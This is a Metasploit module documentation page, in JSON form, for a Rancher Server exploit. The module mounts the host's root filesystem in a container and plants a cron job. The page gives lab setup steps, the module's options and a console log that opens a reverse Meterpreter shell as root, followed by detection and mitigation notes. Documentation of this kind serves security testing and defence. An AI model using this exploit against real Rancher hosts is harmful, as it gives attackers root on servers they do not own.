{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/rancher_server","result":{"data":{"moduleMetadataJson":{"id":"4eb7fe87-5fa7-53e8-8f82-904c40832a30","name":"Rancher Server - Docker Exploit","fullname":"exploit/linux/http/rancher_server","description":"Utilizing Rancher Server, an attacker can create a docker container\n        with the '/' path mounted with read/write permissions on the host\n        server that is running the docker container. As the docker container\n        executes command as uid 0 it is honored by the host operating system\n        allowing the attacker to edit/create files owed by root. This exploit\n        abuses this to creates a cron job in the '/etc/cron.d/' path of the\n        host server.\n\n        The Docker image should exist on the target system or be a valid image\n        from hub.docker.com.\n\n        Use `check` with verbose mode to get a list of exploitable Rancher\n        Hosts managed by the target system.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/rancher_server","documentationSlug":"/modules/documentation/exploit/linux/http/rancher_server"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Utilizing Rancher Server, an attacker can create a docker container\nwith the '/' path mounted with read/write permissions on the host\nserver that is running the docker container. As the docker container\nexecutes command as uid 0 it is honored by the host operating system\nallowing the attacker to edit/create files owned by root. This exploit\nabuses this to creates a cron job in the '/etc/cron.d/' path of the\nhost server.</p>\n<p>The Docker image should exist on the target system or be a valid image\nfrom hub.docker.com.</p>\n<p>Use <code class=\"language-text\">check</code> with verbose mode to get a list of exploitable Rancher\nHosts managed by the target system.</p>\n<h2 id=\"rancher-setup\" style=\"position:relative;\"><a href=\"#rancher-setup\" aria-label=\"rancher setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Rancher setup</h2>\n<p>Rancher is deployed as a set of Docker containers. Running Rancher is\nas simple as launching two containers. One container as the management\nserver and another container on a node as an agent.</p>\n<p>This module was tested with Debian 9 and CentOS 7 as the host operating\nsystem with Docker 17.06.1-ce and Rancher Server 1.6.2, all with\ndefault installation.</p>\n<h3 id=\"install-debian-9\" style=\"position:relative;\"><a href=\"#install-debian-9\" aria-label=\"install debian 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install Debian 9</h3>\n<p>First <a href=\"https://www.debian.org/releases/stretch/amd64/index.html.en\">install Debian 9</a> with default task selection. This includes\nthe \"<em>standard system utilities</em>\".</p>\n<h3 id=\"install-docker-ce\" style=\"position:relative;\"><a href=\"#install-docker-ce\" aria-label=\"install docker ce permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install Docker CE</h3>\n<p>Then install a supported version of <a href=\"https://docs.docker.com/engine/installation/linux/docker-ce/debian/\">Docker on Debian system</a>.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token comment\"># TL;DR</span>\n<span class=\"token function\">apt-get</span> remove docker docker-engine\n<span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> apt-transport-https ca-certificates <span class=\"token function\">curl</span> gnupg2 software-properties-common\n<span class=\"token function\">curl</span> -fsSL https://download.docker.com/linux/debian/gpg <span class=\"token operator\">|</span> apt-key <span class=\"token function\">add</span> -\napt-key fingerprint 0EBFCD88\n<span class=\"token comment\"># Verify that the key ID is 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88.</span>\nadd-apt-repository <span class=\"token string\">\"deb [arch=amd64] https://download.docker.com/linux/debian <span class=\"token variable\"><span class=\"token variable\">$(</span>lsb_release -cs<span class=\"token variable\">)</span></span> stable\"</span>\n<span class=\"token function\">apt-get</span> update\n<span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> docker-ce\ndocker run hello-world</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"rancher-server-management\" style=\"position:relative;\"><a href=\"#rancher-server-management\" aria-label=\"rancher server management permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Rancher Server (Management)</h3>\n<p>I recommend doing a <a href=\"https://rancher.com/docs/rancher/v1.6/en/installing-rancher/installing-server/#launching-rancher-server---single-container-non-ha\">'Rancher Server - Single Container (NON-HA)'\ninstallation</a>.</p>\n<p>If Docker is installed, the command to start a single instance of\nRancher is simple.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token comment\"># TL;DR</span>\n<span class=\"token function\">sudo</span> docker run -d --restart<span class=\"token operator\">=</span>unless-stopped -p <span class=\"token number\">8080</span>:8080 rancher/server</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>If all is passing navigate to <code class=\"language-text\">http://[ip]:8080/</code>. You should see the\nRancher Server UI web application.</p>\n<h3 id=\"rancher-host-agent\" style=\"position:relative;\"><a href=\"#rancher-host-agent\" aria-label=\"rancher host agent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Rancher Host (Agent)</h3>\n<p>Add a <a href=\"https://rancher.com/docs/rancher/v1.6/en/hosts/#adding-a-host\">new host</a> to Rancher Server so that the Docker host can be managed.</p>\n<p><strong>Set Host Registration URL</strong></p>\n<p>The first time that you add a host, you may be required to set up the\nHost Registration URL.</p>\n<ul>\n<li>Navigate to Admin / Settings (<code class=\"language-text\">http://[ip]:8080/admin/settings</code>)</li>\n<li>Check if <code class=\"language-text\">&quot;http://[ip]:8080/&quot;</code> is set </li>\n<li>Click on Save.</li>\n</ul>\n<p><strong>Add new host</strong></p>\n<ul>\n<li>Navigate to Infrastructure / Hosts (<code class=\"language-text\">http://[ip]:8080/env/1a5/infra/hosts</code>)</li>\n<li>Click on Add Host</li>\n<li>Copy the command from Point 5 (and remove sudo prefix)\n<code class=\"language-text\">docker run --rm --privileged -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/rancher:/var/lib/rancher rancher/agent:v1.2.2 http://[ip]:8080/v1/scripts/XXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXX</code></li>\n<li>Paste and run the command on the host</li>\n</ul>\n<p>The new host should pop up on the Hosts screen within a minute.</p>\n<h1 id=\"exploitation\" style=\"position:relative;\"><a href=\"#exploitation\" aria-label=\"exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h1>\n<p>This module is designed to gain root access on a Rancher Host.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<ul>\n<li>CONTAINER_ID if you want to have a human readable name for your container, otherwise it will be randomly generated.</li>\n<li>DOCKERIMAGE is the local image or hub.docker.com available image you want to have Rancher to deploy for this exploit.</li>\n<li>TARGETENV this is the target Rancher Environment. The default environment is <code class=\"language-text\">1a5</code>.</li>\n<li>TARGETHOST is the target Rancher Host. The default host is <code class=\"language-text\">1h1</code>.</li>\n</ul>\n<p>By default access control is disabled, but if enabled, you need API\nKeys with at least \"restrictive\" permission in the environment.\nSee Rancher docs for <a href=\"https://rancher.com/docs/rancher/v1.6/en/api/v2-beta/api-keys/\">api-keys</a> and <a href=\"https://rancher.com/docs/rancher/v1.6/en/environments/#membership-roles\">membership-roles</a>.</p>\n<ul>\n<li>HttpUsername is for your Access Key</li>\n<li>HttpPassword is for your Secret Key</li>\n</ul>\n<p>Advanced Options</p>\n<ul>\n<li>TARGETURI this is the Rancher API base path. The default environment is <code class=\"language-text\">/v1/projects</code>.</li>\n<li>WAIT_TIMEOUT is how long you will wait for a docker container to deploy before bailing out if it does not start.</li>\n</ul>\n<h2 id=\"steps-to-exploit-with-module\" style=\"position:relative;\"><a href=\"#steps-to-exploit-with-module\" aria-label=\"steps to exploit with module permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Steps to exploit with module</h2>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Start msfconsole</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> use exploit/linux/http/rancher_server</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set the options appropriately and set VERBOSE to true</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Verify it creates a docker container and it successfully runs </li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> After a minute a session should be opened from the agent server</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/rancher_server\nmsf exploit(rancher_server) &gt; set RHOST 192.168.91.111\nRHOST =&gt; 192.168.91.111\nmsf exploit(rancher_server) &gt; set PAYLOAD linux/x64/meterpreter/reverse_tcp\nPAYLOAD =&gt; linux/x64/meterpreter/reverse_tcp\nmsf exploit(rancher_server) &gt; set LHOST 192.168.91.1\nLHOST =&gt; 192.168.91.1\nmsf exploit(rancher_server) &gt; set VERBOSE true\nVERBOSE =&gt; true\nmsf exploit(rancher_server) &gt; check\n\n[+] Rancher Host &quot;rancher&quot; (TARGETHOST 1h1) on Environment &quot;Default&quot; (TARGETENV 1a5) found &lt;-- targeted\n[*] 192.168.91.111:8080 The target is vulnerable.\nmsf exploit(rancher_server) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.91.1:4444\n[*] Setting container json request variables\n[*] Creating the docker container command\n[+] The docker container is created, waiting for it to deploy\n[*] Waiting up to 60 seconds for docker container to start\n[+] The docker container has stopped, now trying to remove it\n[+] The docker container has been removed.\n[*] Waiting for the cron job to run, can take up to 60 seconds\n[*] Sending stage (40747 bytes) to 192.168.91.111\n[*] Meterpreter session 1 opened (192.168.91.1:4444 -&gt; 192.168.91.111:49948) at 2017-07-27 22:18:00 +0200\n[+] Deleted /etc/cron.d/wlHVKGMA\n[+] Deleted /tmp/jxKUxUyN\n\nmeterpreter &gt; sysinfo\nComputer     : rancher\nOS           : Debian 9.1 (Linux 4.9.0-3-amd64)\nArchitecture : x64\nMeterpreter  : x64/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"exploit-detection\" style=\"position:relative;\"><a href=\"#exploit-detection\" aria-label=\"exploit detection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Detection</h2>\n<p>Rancher Server has an <a href=\"https://rancher.com/docs/rancher/v1.6/en/rancher-services/audit-log/\">audit log</a>. While running this module two\nevents (create and delete) were logged. Even though the container is\ndeleted, its still able to be viewed from the link in the audit log.</p>\n<h2 id=\"mitigation\" style=\"position:relative;\"><a href=\"#mitigation\" aria-label=\"mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h2>\n<ul>\n<li>Do not deploy a Rancher Host on the same host where the Rancher\nServer is. Your entire rancher infrastructure is in <a href=\"https://rancher.com/docs/rancher/v1.6/en/faqs/troubleshooting/#help-i-turned-on-access-controldocsrancherv16enconfigurationaccess-control-and-can-no-longer-access-rancher-how-do-i-reset-rancher-to-disable-access-control\">danger</a>.</li>\n<li>Only allow trusted users to have more permissions than read-only.</li>\n</ul>\n<p>Docker protection such as Username Namespaces could not be applied\nbecause Rancher Agents run as a privileged container.</p>"}}},"pageContext":{"id":"4eb7fe87-5fa7-53e8-8f82-904c40832a30"}}}